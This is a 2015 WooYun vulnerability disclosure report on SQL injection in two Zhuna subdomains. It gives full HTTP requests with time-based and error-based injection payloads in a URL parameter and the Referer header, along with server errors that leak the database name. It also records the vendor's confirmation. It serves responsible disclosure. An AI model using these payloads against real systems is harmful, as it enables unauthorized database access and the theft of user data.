wybug_title: 住哪网两个子域名SQL注入
wybug_detail:
漏洞详情 披露状态： 2015-03-06： 细节已通知厂商并且等待厂商处理中 2015-03-06： 厂商已经确认，细节仅向厂商公开 2015-03-16： 细节向核心白帽子及相关领域专家公开 2015-03-26： 细节向普通白帽子公开 2015-04-05： 细节向实习白帽子公开 2015-04-20： 细节向公众公开 简要描述： 详细说明： 1.网站：js1.znimg.com 参数orderfrom GET /e/json.php?call=jQuery191083842280972749_1425442006128&hid=6418%2C6672%2C8464%2C9720%2C10979%2C14195%2C14213%2C14429%2C14461%2C20254%2C22001%2C22042&tm1=2015-03-05&tm2=2015-03-06&orderfrom=196;%20waitfor%20delay'0%3a0%3a24'--&r=0.4465443235822022&_=1425442006129 HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)Accept: */*Accept-Language: en-us,en;q=0.8,en-us,en;q=0.5Cache-Control: no-cacheHost: js1.znimg.comAccept-Encoding: gzip, deflate POC: user_name()='root' 漏洞证明： 2.网站union.zhuna.cnagent_id 和Referer 都存在注入，权限高可dump所有会员 GET /7days.asp?agent_id=3 HTTP/1.1Referer: http://www.cc.cc',convert(int,(select host_name())),1);-- Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) Cache-Control: no-cacheAccept-Language: en-us,en;q=0.5Host: union.zhuna.cnAccept-Encoding: gzip, deflate TTP/1.1 500 Internal Server ErrorDate: Wed, 04 Mar 2015 15:15:54 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETContent-Length: 352Content-Type: text/htmlSet-Cookie: ASPSESSIONIDSABAASDR=PEEOANADELKGJGBMMOIMNOJM; path=/Cache-control: private

/7days.asp£¬ÐÐ 46 GET /7days.asp?agent_id=3 HTTP/1.1Referer: http://www.cc.cc',convert(int,(select user_name())),1);-- Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.78 Safari/532.5Cache-Control: no-cacheAccept-Language: en-us,en;q=0.5X-Forwarded-For: 127.0.0.1Host: union.zhuna.cnAccept-Encoding: gzip, deflateHTTP/1.1 500 Internal Server ErrorDate: Wed, 04 Mar 2015 15:16:48 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETContent-Length: 356Content-Type: text/htmlSet-Cookie: ASPSESSIONIDSABAASDR=DFEOANADDBJHCHDMEEEGCHHK; path=/Cache-control: private

Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e07'

[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 'db_zhuna_cn' 转换成数据类型 int 时失败。

/7days.asp，行 46 数据不多贴了 修复方案： 版权声明：转载请注明来源 Forever80s@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-06 14:15 厂商回复： 非常感谢您的反馈，相关问题已转交技术处理。 最新状态： 暂无
